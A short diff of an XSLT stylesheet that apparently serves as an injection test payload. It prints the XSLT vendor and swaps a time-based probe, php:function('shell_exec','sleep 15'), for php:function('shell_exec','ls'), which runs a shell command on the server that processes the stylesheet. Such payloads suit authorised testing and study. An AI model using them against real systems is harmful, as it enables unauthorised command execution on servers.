@@ -4,7 +4,7 @@
     <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
     <p>
         <xsl:value-of select="system-property('xsl:vendor')"/>
-	    <xsl:value-of select="php:function('shell_exec','sleep 15')"/>
+	    <xsl:value-of select="php:function('shell_exec', 'ls')" />
     </p>
 </body>
 </html> 
